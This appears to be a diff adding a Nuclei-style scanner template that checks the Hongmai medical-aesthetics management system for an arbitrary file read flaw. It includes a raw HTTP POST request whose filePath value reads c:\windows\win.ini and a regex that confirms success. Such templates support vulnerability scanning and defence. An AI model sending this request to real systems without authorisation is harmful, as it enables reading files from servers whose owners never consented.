@@ -1,0 +1,24 @@
+id: hongmai-DownLoadServerFile-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 宏脉医美行业管理系统DownLoadServerFile任意文件读取下载漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E8%84%89%E5%8C%BB%E7%BE%8E%E8%A1%8C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDownLoadServerFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /zh-CN/PublicInterface/DownLoadServerFile HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Length: 27
+
+        filePath=c:\windows\win.ini
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
